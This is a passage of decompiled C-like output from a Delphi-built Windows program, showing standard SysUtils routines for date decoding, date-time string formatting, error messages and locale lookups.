  if ( !Sysutils::TryEncodeDate(a2, a3, a1, &v10) )
  {
    System::LoadResString((int)off_41DC04[0], &v9);
    sub_406CBC(v4, v3);
  }
  v5 = v8;
  __writefsdword(0, v7[0]);
  v8 = (LStr *)&loc_407EF7;
  System::__linkproc__ LStrClr(v5);
  return v10;
}
// 407ED5: variable 'v4' is possibly undefined
// 407ED5: variable 'v3' is possibly undefined
// 41DC04: using guessed type int **off_41DC04[5];

//----- (00407F04) --------------------------------------------------------
_WORD *__userpurge SysUtils::_16631@<eax>(unsigned __int16 *a1@<eax>, _WORD *a2@<edx>, _WORD *a3@<ecx>, int a4, double a5)
{
  int v5; // ecx
  _WORD *result; // eax
  signed int v7; // ecx
  __int16 i; // bx
  __int16 v9; // bx
  __int16 v10; // bx
  unsigned __int16 v11; // bx
  char *v12; // edx
  int v13; // eax
  int v14; // [esp+8h] [ebp-18h] BYREF
  int v15; // [esp+Ch] [ebp-14h]
  unsigned __int16 v16; // [esp+10h] [ebp-10h] BYREF
  unsigned __int16 v17; // [esp+12h] [ebp-Eh] BYREF
  _WORD *v18; // [esp+14h] [ebp-Ch]
  _WORD *v19; // [esp+18h] [ebp-8h]
  unsigned __int16 *v20; // [esp+1Ch] [ebp-4h]

  v18 = a3;
  v19 = a2;
  v20 = a1;
  Sysutils::DateTimeToTimeStamp(&v14, a5);
  v5 = v15;
  if ( v15 > 0 )
  {
    *(_WORD *)a4 = v15 % 7;
    v7 = v5 - 1;
    for ( i = 1; v7 >= 146097; i += 400 )
      v7 -= 146097;
    sub_406CA0(v7, 0x8EACu, &v16, &v17);
    if ( v16 == 4 )
    {
      v16 = 3;
      v17 -= 29012;
    }
    v9 = 100 * v16 + i;
    sub_406CA0(v17, 0x5B5u, &v16, &v17);
    v10 = 4 * v16 + v9;
    sub_406CA0(v17, 0x16Du, &v16, &v17);
    if ( v16 == 4 )
    {
      v16 = 3;
      v17 += 365;
    }
    v11 = v16 + v10;
    v13 = 3 * (Sysutils::IsLeapYear(v11) & 0x7F);
    v12 = (char *)&unk_41C0D4 + 8 * v13;
    LOWORD(v13) = 1;
    while ( 1 )
    {
      v16 = *(_WORD *)&v12[2 * (unsigned __int16)v13 - 2];
      if ( v17 < v16 )
        break;
      v17 -= v16;
      ++v13;
    }
    *v20 = v11;
    *v19 = v13;
    LOWORD(v13) = v17;
    result = (_WORD *)(v13 + 1);
    *v18 = (_WORD)result;
  }
  else
  {
    *v20 = 0;
    *v19 = 0;
    result = v18;
    *v18 = 0;
    *(_WORD *)a4 = 0;
  }
  return result;
}

//----- (00408048) --------------------------------------------------------
_WORD *__userpurge sub_408048@<eax>(unsigned __int16 *a1@<eax>, _WORD *a2@<edx>, _WORD *a3@<ecx>, double a4)
{
  int var2; // [esp+6h] [ebp-2h] BYREF

  return SysUtils::_16631(a1, a2, a3, (int)&var2, a4);
}

//----- (00408068) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __stdcall Sysutils::DayOfWeek(double a1)
{
  _DWORD v2[2]; // [esp+0h] [ebp-8h] BYREF

  Sysutils::DateTimeToTimeStamp(v2, a1);
  return v2[1] % 7 + 1;
}

//----- (00408090) --------------------------------------------------------
long double __usercall Sysutils::Now@<st0>()
{
  unsigned __int16 v1; // [esp+0h] [ebp-20h]
  struct _SYSTEMTIME SystemTime; // [esp+8h] [ebp-18h] BYREF
  double v3; // [esp+18h] [ebp-8h]

  GetLocalTime(&SystemTime);
  v3 = Sysutils::EncodeDate(SystemTime.wDay, SystemTime.wYear, SystemTime.wMonth);
  return Sysutils::EncodeTime(SystemTime.wSecond, SystemTime.wMinute, SystemTime.wHour, SystemTime.wMilliseconds, v1)
       + v3;
}
// 4080CB: variable 'v1' is possibly undefined

//----- (004080E0) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __usercall SysUtils::_16643@<eax>(BYTE *a1@<eax>, int a2@<edx>, int a3)
{
  int v3; // ebx
  int result; // eax

  v3 = 256 - *(_DWORD *)(a3 - 260);
  if ( a2 < v3 )
    v3 = a2;
  if ( v3 )
    Move(a1, (BYTE *)(a3 + *(_DWORD *)(a3 - 260) - 256), v3);
  result = a3;
  *(_DWORD *)(a3 - 260) += v3;
  return result;
}

//----- (00408124) --------------------------------------------------------
int __usercall sub_408124@<eax>(BYTE *a1@<eax>, int a2)
{
  int v3; // eax

  v3 = sub_403724((int)a1);
  return SysUtils::_16643(a1, v3, a2);
}

//----- (00408144) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __usercall SysUtils::_16646_0@<eax>(int a1@<eax>, int a2@<edx>, int a3)
{
  _BYTE *v3; // eax
  int v5; // [esp+8h] [ebp-20h] BYREF
  char v6; // [esp+Ch] [ebp-1Ch]
  int v7; // [esp+10h] [ebp-18h]
  char v8; // [esp+14h] [ebp-14h]
  unsigned __int8 v9[16]; // [esp+18h] [ebp-10h] BYREF

  v5 = a2;
  v6 = 0;
  v7 = a1;
  v8 = 0;
  v3 = Sysutils::FormatBuf(v9, 0x10u, byte_41C15C, 1, (int)&v5, 4);
  return SysUtils::_16643(v9, (int)v3, a3);
}

//----- (00408190) --------------------------------------------------------
int __cdecl SysUtils::_16719(int a1)
{
  _DWORD *v1; // eax
  int v2; // edx
  int result; // eax

  v1 = (_DWORD *)(a1 - 4);
  v2 = *(_DWORD *)(a1 - 4);
  while ( *(_BYTE *)*v1 == *(_BYTE *)(a1 - 5) )
    ++*v1;
  result = *v1 - v2 + 1;
  *(_DWORD *)(a1 - 12) = result;
  return result;
}

//----- (004081BC) --------------------------------------------------------
int __cdecl SysUtils::_16648(int a1)
{
  int result; // eax

  result = a1;
  if ( !*(_BYTE *)(a1 - 19) )
  {
    sub_408048(
      (unsigned __int16 *)(a1 - 14),
      (_WORD *)(a1 - 16),
      (_WORD *)(a1 - 18),
      *(double *)(*(_DWORD *)(a1 + 8) + 8));
    result = a1;
    *(_BYTE *)(a1 - 19) = 1;
  }
  return result;
}

//----- (004081F4) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __cdecl SysUtils::_16649(int a1)
{
  int result; // eax

  result = a1;
  if ( !*(_BYTE *)(a1 - 29) )
  {
    Sysutils::DecodeTime(
      (_WORD *)(a1 - 22),
      (_WORD *)(a1 - 24),
      (_WORD *)(a1 - 26),
      a1 - 28,
      *(double *)(*(_DWORD *)(a1 + 8) + 8));
    result = a1;
    *(_BYTE *)(a1 - 29) = 1;
  }
  return result;
}

//----- (00408234) --------------------------------------------------------
void __usercall sub_408234(int a1@<eax>, BYTE **a2@<edx>, int a3)
{
  LCID v5; // eax
  int v6; // eax
  int v7; // eax
  BYTE *v8; // esi
  int v9; // eax
  LStr *v10; // ecx
  LStr *v11; // ecx
  char *v12; // [esp-18h] [ebp-138h]
  unsigned int v13[2]; // [esp-Ch] [ebp-12Ch] BYREF
  LStr *v14; // [esp-4h] [ebp-124h]
  BYTE *v15; // [esp+8h] [ebp-118h] BYREF
  CHAR DateStr[256]; // [esp+Ch] [ebp-114h] BYREF
  SYSTEMTIME Date; // [esp+10Ch] [ebp-14h] BYREF
  char *v18; // [esp+11Ch] [ebp-4h] BYREF
  int savedregs; // [esp+120h] [ebp+0h] BYREF

  v15 = 0;
  v18 = 0;
  v14 = (LStr *)&savedregs;
  v13[1] = (unsigned int)&loc_408386;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  System::__linkproc__ LStrClr(0);
  Date.wYear = *(_WORD *)(a3 - 14);
  Date.wMonth = *(_WORD *)(a3 - 16);
  Date.wDay = *(_WORD *)(a3 - 18);
  __linkproc__ LStrLAsg(&v18, (char *)&dword_40839C);
  v12 = sub_4038E8(v18);
  v5 = GetThreadLocale_0();
  if ( GetDateFormatA(v5, 4u, &Date, v12, DateStr, 256) )
  {
    sub_4036F8(a2, (BYTE *)DateStr, 256);
    if ( a1 == 1 )
    {
      if ( word_41E5AC == 4 )
      {
        if ( word_41E5AE == 1 )
        {
          v7 = sub_403724((int)*a2);
          if ( Sysutils::ByteToCharLen(v7, (int)*a2) == 4 )
          {
            v8 = (BYTE *)&DateStr[Sysutils::CharToByteIndex(3, (int)*a2) - 1];
            __linkproc__ LStrFromPChar_0(&v15, v8);
            v9 = Sysutils::CharToByteLen(2, (int)v15);
            __linkproc__ LStrFromPCharLen(a2, v8, v9);
          }
        }
      }
      else if ( word_41E5AC == 17 )
      {
        v6 = Sysutils::CharToByteLen(1, (int)*a2);
        __linkproc__ LStrCopy((char *)*a2, 1, v6, (char **)a2);
      }
    }
  }
  v10 = v14;
  __writefsdword(0, v13[0]);
  v14 = (LStr *)&loc_40838D;
  System::__linkproc__ LStrClr(v10);
  System::__linkproc__ LStrClr(v11);
}
// 408380: variable 'v11' is possibly undefined
// 40839C: using guessed type int dword_40839C;
// 41E5AC: using guessed type __int16 word_41E5AC;
// 41E5AE: using guessed type __int16 word_41E5AE;

//----- (004083A0) --------------------------------------------------------
void __usercall SysUtils::_16651(int a1@<eax>, BYTE **a2@<edx>, int a3)
{
  LCID v5; // eax
  int v6; // eax
  LStr *v7; // ecx
  char *v8; // [esp-18h] [ebp-134h]
  unsigned int v9[2]; // [esp-Ch] [ebp-128h] BYREF
  LStr *v10; // [esp-4h] [ebp-120h]
  CHAR DateStr[256]; // [esp+8h] [ebp-114h] BYREF
  SYSTEMTIME Date; // [esp+108h] [ebp-14h] BYREF
  char *v13; // [esp+118h] [ebp-4h] BYREF
  int savedregs; // [esp+11Ch] [ebp+0h] BYREF

  v13 = 0;
  v10 = (LStr *)&savedregs;
  v9[1] = (unsigned int)&loc_40847E;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  System::__linkproc__ LStrClr(0);
  Date.wYear = *(_WORD *)(a3 - 14);
  Date.wMonth = *(_WORD *)(a3 - 16);
  Date.wDay = *(_WORD *)(a3 - 18);
  if ( a1 > 2 )
    __linkproc__ LStrLAsg(&v13, "yyyy");
  else
    __linkproc__ LStrLAsg(&v13, (char *)dword_408494);
  v8 = sub_4038E8(v13);
  v5 = GetThreadLocale_0();
  if ( GetDateFormatA(v5, 4u, &Date, v8, DateStr, 256) )
  {
    sub_4036F8(a2, (BYTE *)DateStr, 256);
    if ( a1 == 1 && **a2 == 48 )
    {
      v6 = sub_403724((int)*a2);
      __linkproc__ LStrCopy((char *)*a2, 2, v6 - 1, (char **)a2);
    }
  }
  v7 = v10;
  __writefsdword(0, v9[0]);
  v10 = (LStr *)&loc_408485;
  System::__linkproc__ LStrClr(v7);
}
// 408494: using guessed type int dword_408494[3];

//----- (004084A8) --------------------------------------------------------
void __usercall sub_4084A8(BYTE *a1@<eax>, int a2)
{
  char v2; // bl
  BYTE v3; // al
  int v4; // eax
  int v5; // eax
  BYTE *v6; // esi
  _BYTE *v7; // esi
  unsigned int v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // eax
  unsigned int v11; // eax
  unsigned __int16 v12; // ax
  BYTE *v13; // esi
  int v14; // eax
  int v15; // eax
  BYTE *v16; // esi
  BYTE v17; // al
  LStr *v18; // ecx
  unsigned int v19[2]; // [esp-Ch] [ebp-3Ch] BYREF
  LStr *v20; // [esp-4h] [ebp-34h]
  BYTE *v21; // [esp+8h] [ebp-28h] BYREF
  BYTE *v22; // [esp+Ch] [ebp-24h] BYREF
  char v23; // [esp+11h] [ebp-1Fh]
  char v24; // [esp+12h] [ebp-1Eh]
  char v25; // [esp+13h] [ebp-1Dh]
  unsigned __int16 v26; // [esp+14h] [ebp-1Ch]
  unsigned __int16 v27; // [esp+16h] [ebp-1Ah]
  unsigned __int16 v28; // [esp+18h] [ebp-18h]
  unsigned __int16 v29; // [esp+1Ah] [ebp-16h]
  char v30; // [esp+1Dh] [ebp-13h]
  unsigned __int16 v31; // [esp+1Eh] [ebp-12h]
  unsigned __int16 v32; // [esp+20h] [ebp-10h]
  unsigned __int16 v33; // [esp+22h] [ebp-Eh]
  int v34; // [esp+24h] [ebp-Ch]
  BYTE v35; // [esp+2Bh] [ebp-5h] BYREF
  BYTE *v36; // [esp+2Ch] [ebp-4h]
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v21 = 0;
  v22 = 0;
  v36 = a1;
  v20 = (LStr *)&savedregs;
  v19[1] = (unsigned int)&loc_408BE9;
  v19[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v19);
  if ( a1 && *(int *)(a2 - 264) < 2 )
  {
    ++*(_DWORD *)(a2 - 264);
    v2 = 32;
    v30 = 0;
    v25 = 0;
    v24 = 0;
    while ( 1 )
    {
      while ( 1 )
      {
LABEL_104:
        v17 = *v36;
        if ( !*v36 )
        {
LABEL_105:
          --*(_DWORD *)(a2 - 264);
          goto LABEL_106;
        }
        v35 = *v36++;
        if ( !_bittest(dword_41C104, v17) )
          break;
        if ( !*v36 )
          goto LABEL_105;
        ++v36;
        v2 = 32;
      }
      v3 = v35;
      if ( (unsigned __int8)(v35 - 97) < 0x1Au )
        v3 = v35 - 32;
      if ( (unsigned __int8)(v3 - 65) < 0x1Au )
      {
        if ( v3 == 77 && v2 == 72 )
          v3 = 78;
        v2 = v3;
      }
      switch ( v3 )
      {
        case '"':
        case '\'':
          v16 = v36;
          while ( *v36 )
          {
            if ( *v36 == v35 )
              break;
            if ( _bittest(dword_41C104, *v36) )
            {
              if ( !*++v36 )
                break;
            }
            ++v36;
          }
          SysUtils::_16643(v16, v36 - v16, a2);
          if ( *v36 )
            ++v36;
          goto LABEL_104;
        case '/':
          SysUtils::_16643((BYTE *)&byte_41E4F1, 1, a2);
          goto LABEL_104;
        case ':':
          SysUtils::_16643((BYTE *)&byte_41E4FC, 1, a2);
          goto LABEL_104;
        case 'A':
          SysUtils::_16649((int)&savedregs);
          v13 = v36 - 1;
          if ( Sysutils::StrLIComp((const char *)5, "AM/PM", v36 - 1) )
          {
            if ( Sysutils::StrLIComp((const char *)3, "A/P", v13) )
            {
              if ( Sysutils::StrLIComp((const char *)4, "AMPM", v13) )
              {
                if ( Sysutils::StrLIComp((const char *)4, "AAAA", v13) )
                {
                  if ( Sysutils::StrLIComp((const char *)3, (const char *)&off_408C14, v13) )
                    goto LABEL_103;
                  SysUtils::_16648((int)&savedregs);
                  v15 = Sysutils::DayOfWeek(*(double *)(a2 + 8));
                  sub_408124((BYTE *)dword_41E56C[v15], a2);
                  v36 += 2;
                }
                else
                {
                  SysUtils::_16648((int)&savedregs);
                  v14 = Sysutils::DayOfWeek(*(double *)(a2 + 8));
                  sub_408124((BYTE *)dword_41E588[v14], a2);
                  v36 += 3;
                }
              }
              else
              {
                if ( v29 >= 0xCu )
                  sub_408124((BYTE *)dword_41E504, a2);
                else
                  sub_408124((BYTE *)dword_41E500, a2);
                v36 += 3;
                v24 = 1;
              }
            }
            else
            {
              if ( v29 >= 0xCu )
                v13 += 2;
              SysUtils::_16643(v13, 1, a2);
              v36 += 2;
              v24 = 1;
            }
          }
          else
          {
            if ( v29 >= 0xCu )
              v13 += 3;
            SysUtils::_16643(v13, 2, a2);
            v36 += 4;
            v24 = 1;
          }
          goto LABEL_104;
        case 'C':
          SysUtils::_16719((int)&savedregs);
          sub_4084A8(a2);
          SysUtils::_16649((int)&savedregs);
          if ( v29 || v28 || v27 )
          {
            SysUtils::_16643((BYTE *)&dword_408C18, 1, a2);
            sub_4084A8(a2);
          }
          goto LABEL_104;
        case 'D':
          SysUtils::_16719((int)&savedregs);
          if ( (unsigned int)(v34 - 1) < 2 )
          {
            SysUtils::_16648((int)&savedregs);
            SysUtils::_16646_0(v31, v34, a2);
          }
          else if ( v34 == 3 )
          {
            v4 = Sysutils::DayOfWeek(*(double *)(a2 + 8));
            sub_408124((BYTE *)dword_41E56C[v4], a2);
          }
          else
          {
            if ( v34 != 4 )
              goto LABEL_28;
            v5 = Sysutils::DayOfWeek(*(double *)(a2 + 8));
            sub_408124((BYTE *)dword_41E588[v5], a2);
          }
          goto LABEL_104;
        case 'E':
          SysUtils::_16719((int)&savedregs);
          SysUtils::_16648((int)&savedregs);
          SysUtils::_16651(v34, &v21, (int)&savedregs);
          sub_408124(v21, a2);
          goto LABEL_104;
        case 'G':
          SysUtils::_16719((int)&savedregs);
          SysUtils::_16648((int)&savedregs);
          sub_408234(v34, &v22, (int)&savedregs);
          sub_408124(v22, a2);
          goto LABEL_104;
        case 'H':
          SysUtils::_16719((int)&savedregs);
          SysUtils::_16649((int)&savedregs);
          v23 = 0;
          v6 = v36;
          break;
        case 'M':
          SysUtils::_16719((int)&savedregs);
          SysUtils::_16648((int)&savedregs);
          if ( (unsigned int)(v34 - 1) < 2 )
          {
            SysUtils::_16646_0(v32, v34, a2);
          }
          else if ( v34 == 3 )
          {
            sub_408124((BYTE *)dword_41E50C[v32], a2);
          }
          else
          {
            sub_408124((BYTE *)dword_41E53C[v32], a2);
          }
          goto LABEL_104;
        case 'N':
          SysUtils::_16719((int)&savedregs);
          SysUtils::_16649((int)&savedregs);
          if ( v34 > 2 )
            v34 = 2;
          SysUtils::_16646_0(v28, v34, a2);
          goto LABEL_104;
        case 'S':
          SysUtils::_16719((int)&savedregs);
          SysUtils::_16649((int)&savedregs);
          if ( v34 > 2 )
            v34 = 2;
          SysUtils::_16646_0(v27, v34, a2);
          goto LABEL_104;
        case 'T':
          SysUtils::_16719((int)&savedregs);
LABEL_28:
          sub_4084A8(a2);
          goto LABEL_104;
        case 'Y':
          SysUtils::_16719((int)&savedregs);
          SysUtils::_16648((int)&savedregs);
          if ( v34 > 2 )
            SysUtils::_16646_0(v33, 4, a2);
          else
            SysUtils::_16646_0(v33 % 0x64u, 2, a2);
          goto LABEL_104;
        case 'Z':
          SysUtils::_16719((int)&savedregs);
          SysUtils::_16649((int)&savedregs);
          if ( v34 > 3 )
            v34 = 3;
          SysUtils::_16646_0(v26, v34, a2);
          goto LABEL_104;
        default:
LABEL_103:
          SysUtils::_16643(&v35, 1, a2);
          goto LABEL_104;
      }
      while ( *v6 )
      {
        if ( _bittest(dword_41C104, *v6) )
        {
          v7 = v6 + 1;
          if ( !*v7 )
            break;
          v6 = v7 + 1;
        }
        else
        {
          v8 = *v6;
          if ( v8 > 0x48 )
          {
            v11 = v8 - 97;
            if ( v11 )
            {
              if ( v11 == 7 )
                break;
              goto LABEL_51;
            }
LABEL_45:
            if ( !v23 )
            {
              if ( !Sysutils::StrLIComp((const char *)5, "AM/PM", v6)
                || !Sysutils::StrLIComp((const char *)3, "A/P", v6)
                || !Sysutils::StrLIComp((const char *)4, "AMPM", v6) )
              {
                v24 = 1;
              }
              break;
            }
            goto LABEL_51;
          }
          if ( v8 == 72 )
            break;
          v9 = v8 - 34;
          if ( !v9 || (v10 = v9 - 5) == 0 )
          {
            v23 ^= 1u;
            goto LABEL_51;
          }
          if ( v10 == 26 )
            goto LABEL_45;
LABEL_51:
          ++v6;
        }
      }
      v12 = v29;
      if ( v24 )
      {
        if ( v29 )
        {
          if ( v29 > 0xCu )
            v12 = v29 - 12;
        }
        else
        {
          v12 = 12;
        }
      }
      if ( v34 > 2 )
        v34 = 2;
      SysUtils::_16646_0(v12, v34, a2);
    }
  }
LABEL_106:
  v18 = v20;
  __writefsdword(0, v19[0]);
  v20 = (LStr *)&loc_408BF0;
  System::__linkproc__ LStrArrayClr(v18, 2);
}
// 408C14: using guessed type void *off_408C14;
// 408C18: using guessed type int dword_408C18;
// 41E4F1: using guessed type char byte_41E4F1;
// 41E4F4: using guessed type int dword_41E4F4;
// 41E4F8: using guessed type int dword_41E4F8;
// 41E4FC: using guessed type char byte_41E4FC;
// 41E500: using guessed type int dword_41E500;
// 41E504: using guessed type int dword_41E504;
// 41E508: using guessed type int dword_41E508;
// 41E50C: using guessed type int dword_41E50C[];
// 41E53C: using guessed type int dword_41E53C[];
// 41E56C: using guessed type int dword_41E56C[];
// 41E588: using guessed type int dword_41E588[];

//----- (00408C1C) --------------------------------------------------------
int __userpurge Sysutils::DateTimeToString@<eax>(int a1@<eax>, int a2@<edx>)
{
  int result; // eax
  BYTE v4[256]; // [esp+10h] [ebp-100h] BYREF
  int savedregs; // [esp+110h] [ebp+0h] BYREF

  if ( a2 )
    sub_4084A8((BYTE *)a2, (int)&savedregs);
  else
    sub_4084A8((BYTE *)&dword_408C74, (int)&savedregs);
  __linkproc__ LStrFromPCharLen((BYTE **)a1, v4, 0);
  return result;
}
// 408C1C: inconsistent function type and number of purged bytes
// 408C74: using guessed type int dword_408C74;

//----- (00408C78) --------------------------------------------------------
int __userpurge sub_408C78@<eax>(int a1@<eax>, int a2, int a3)
{
  return Sysutils::DateTimeToString(a1, 0);
}

//----- (00408C8C) --------------------------------------------------------
int __userpurge sub_408C8C@<eax>(int a1@<eax>, int a2@<edx>, int a3, int a4)
{
  return Sysutils::DateTimeToString(a2, a1);
}

//----- (00408CA0) --------------------------------------------------------
void __usercall SysErrorMessage(DWORD a1@<eax>, BYTE **a2@<edx>)
{
  int i; // eax
  unsigned __int8 v5; // dl
  bool v6; // cf
  char v7; // dl
  char v8; // [esp+1h] [ebp-105h]
  CHAR Buffer[260]; // [esp+2h] [ebp-104h] BYREF

  for ( i = FormatMessageA(0x3000u, 0, a1, 0, Buffer, 0x100u, 0); i > 0; --i )
  {
    v5 = *(&v8 + i);
    v6 = v5 < 0x21u;
    v7 = v5 - 33;
    if ( !v6 && v7 != 13 )
      break;
  }
  __linkproc__ LStrFromPCharLen(a2, (BYTE *)Buffer, i);
}

//----- (00408CEC) --------------------------------------------------------
void __userpurge Sysutils::GetLocaleStr(LCID Locale@<ecx>, LCTYPE LCType@<edx>, LCID a3@<eax>, const int System::AnsiString)
{
  int v5; // eax
  CHAR LCData[256]; // [esp+8h] [ebp-100h] BYREF

  v5 = GetLocaleInfoA_0(a3, LCType, LCData, 256);
  if ( v5 <= 0 )
    __linkproc__ LStrAsg((char **)System::AnsiString, (char *)Locale);
  else
    __linkproc__ LStrFromPCharLen((BYTE **)System::AnsiString, (BYTE *)LCData, v5 - 1);
}

//----- (00408D38) --------------------------------------------------------
int __usercall Sysutils::GetLocaleChar@<eax>(LCID Locale@<ecx>, LCTYPE LCType@<edx>, LCID a3@<eax>)
{
  int result; // eax
  LCID LCData[4]; // [esp+0h] [ebp-10h] BYREF

  LCData[0] = Locale;
  result = GetLocaleInfoA_0(a3, LCType, (LPSTR)LCData, 2);
  if ( result <= 0 )
    return Locale;
  LOBYTE(result) = LCData[0];
  return result;
}

//----- (00408D60) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
void __userpurge SysUtils::_16679(LCTYPE LCType@<ecx>, int a2@<edx>, LCTYPE a3@<eax>, int a4, int a5, int a6)
{
  Sysutils::GetLocaleStr(0, a3, *(_DWORD *)(a6 - 4), a4);
  if ( !*(_DWORD *)a4 )
    System::LoadResString(*(_DWORD *)(LCType + 4 * a2), (BYTE **)a4);
}

//----- (00408D9C) --------------------------------------------------------
void __usercall SysUtils::_16680_0(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // ebx
  char **v4; // esi
  char **v5; // edi
  int v6; // ebx
  char **v7; // esi
  char **v8; // edi
  LStr *v9; // ecx
  unsigned int v10[2]; // [esp-18h] [ebp-30h] BYREF
  LStr *v11; // [esp-10h] [ebp-28h]
  int v12; // [esp-Ch] [ebp-24h]
  int v13; // [esp-8h] [ebp-20h]
  int v14; // [esp-4h] [ebp-1Ch]
  char *v15; // [esp+0h] [ebp-18h] BYREF
  char *v16; // [esp+4h] [ebp-14h] BYREF
  char *v17; // [esp+8h] [ebp-10h] BYREF
  char *v18; // [esp+Ch] [ebp-Ch] BYREF
  int v19; // [esp+10h] [ebp-8h]
  LCID v20; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v20 = 0;
  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = 0;
  v14 = a1;
  v13 = a3;
  v12 = a2;
  v11 = (LStr *)&savedregs;
  v10[1] = (unsigned int)&loc_408EAF;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v20 = GetThreadLocale_0();
  v3 = 1;
  v4 = (char **)&unk_41E510;
  v5 = (char **)&unk_41E540;
  do
  {
    SysUtils::_16679((LCTYPE)off_41C160, v3 - 1, v3 + 67, (int)&v18, 11, (int)&savedregs);
    __linkproc__ LStrAsg(v4, v18);
    SysUtils::_16679((LCTYPE)off_41C190, v3 - 1, v3 + 55, (int)&v17, 11, (int)&savedregs);
    __linkproc__ LStrAsg(v5, v17);
    ++v3;
    ++v5;
    ++v4;
  }
  while ( v3 != 13 );
  v6 = 1;
  v7 = (char **)&unk_41E570;
  v8 = (char **)&unk_41E58C;
  do
  {
    v19 = (v6 + 5) % 7;
    SysUtils::_16679((LCTYPE)off_41C1C0, v6 - 1, v19 + 49, (int)&v16, 6, (int)&savedregs);
    __linkproc__ LStrAsg(v7, v16);
    SysUtils::_16679((LCTYPE)off_41C1DC, v6 - 1, v19 + 42, (int)&v15, 6, (int)&savedregs);
    __linkproc__ LStrAsg(v8, v15);
    ++v6;
    ++v8;
    ++v7;
  }
  while ( v6 != 8 );
  v9 = v11;
  __writefsdword(0, v10[0]);
  v11 = (LStr *)&loc_408EB6;
  System::__linkproc__ LStrArrayClr(v9, 4);
}
// 408D9C: could not find valid save-restore pair for ebx
// 408D9C: could not find valid save-restore pair for edi
// 408D9C: could not find valid save-restore pair for esi
// 41C160: using guessed type int **off_41C160[38];
// 41C190: using guessed type int **off_41C190[26];
// 41C1C0: using guessed type int **off_41C1C0[14];
// 41C1DC: using guessed type int **off_41C1DC[7];

//----- (00408EC0) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
BOOL __stdcall SysUtils::_16681(LPSTR a1)
{
  int v1; // esi
  int i; // ebx

  v1 = 0;
  for ( i = 1; dword_41E5B0[i]; ++i )
  {
    if ( i == 7 )
      return v1;
  }
  __linkproc__ LStrFromPChar_0((BYTE **)&dword_41E5B0[i], (BYTE *)a1);
  return 1;
}
// 41E5B0: using guessed type int dword_41E5B0[];

//----- (00408EFC) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
BOOL __stdcall SysUtils::_16682(LPSTR a1)
{
  int v1; // esi
  int i; // ebx
  char *v3; // ecx
  LStr *v4; // ecx
  unsigned int v6[2]; // [esp-14h] [ebp-18h] BYREF
  LStr *v7; // [esp-Ch] [ebp-10h]
  BYTE *v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = (LStr *)&savedregs;
  v6[1] = (unsigned int)&loc_408F61;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v1 = 0;
  for ( i = 1; dword_41E5CC[i] != -1; ++i )
  {
    if ( i == 7 )
      goto LABEL_6;
  }
  __linkproc__ LStrFromPChar_0(&v8, (BYTE *)a1);
  dword_41E5CC[i] = sub_407058((int)v8, 0, v3);
  v1 = 1;
LABEL_6:
  v4 = v7;
  __writefsdword(0, v6[0]);
  v7 = (LStr *)&loc_408F68;
  System::__linkproc__ LStrClr(v4);
  return v1;
}
// 408F3A: variable 'v3' is possibly undefined
// 41E5CC: using guessed type int dword_41E5CC[];

//----- (00408F74) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
void Sysutils::_16951()
{
  LCID v0; // eax
  char *v1; // ecx
  int v2; // esi
  LCID v3; // eax
  int v4; // edx
  _DWORD *v5; // eax
  LCID v6; // eax
  LStr *v7; // ecx
  unsigned int v8[2]; // [esp-10h] [ebp-14h] BYREF
  LStr *v9; // [esp-8h] [ebp-Ch]
  int v10; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v10 = 0;
  v9 = (LStr *)&savedregs;
  v8[1] = (unsigned int)&loc_40900B;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v0 = GetThreadLocale_0();
  Sysutils::GetLocaleStr((LCID)&dword_409020, 0x100Bu, v0, (const int)&v10);
  v2 = sub_407058(v10, 1, v1);
  if ( (unsigned int)(v2 - 3) < 3 )
  {
    v3 = GetThreadLocale_0();
    EnumCalendarInfoA(SysUtils::_16681, v3, v2, 4u);
    v4 = 7;
    v5 = &unk_41E5D0;
    do
    {
      *v5++ = -1;
      --v4;
    }
    while ( v4 );
    v6 = GetThreadLocale_0();
    EnumCalendarInfoA(SysUtils::_16682, v6, v2, 3u);
  }
  v7 = v9;
  __writefsdword(0, v8[0]);
  v9 = (LStr *)&loc_409012;
  System::__linkproc__ LStrClr(v7);
}
// 408FA8: variable 'v1' is possibly undefined
// 409020: using guessed type int dword_409020;

//----- (00409024) --------------------------------------------------------
void __usercall SysUtils::_16684(char *a1@<eax>, BYTE **a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v7; // ebx
  LCID v8; // eax
  char *v9; // ecx
  LStr *v11; // ecx
  unsigned int v12[2]; // [esp-18h] [ebp-28h] BYREF
  LStr *v13; // [esp-10h] [ebp-20h]
  int v14; // [esp-Ch] [ebp-1Ch]
  int v15; // [esp-8h] [ebp-18h]
  int v16; // [esp-4h] [ebp-14h]
  BYTE *v17; // [esp+0h] [ebp-10h] BYREF
  char *v18; // [esp+4h] [ebp-Ch] BYREF
  BYTE *v19; // [esp+8h] [ebp-8h] BYREF
  int v20; // [esp+Ch] [ebp-4h] BYREF
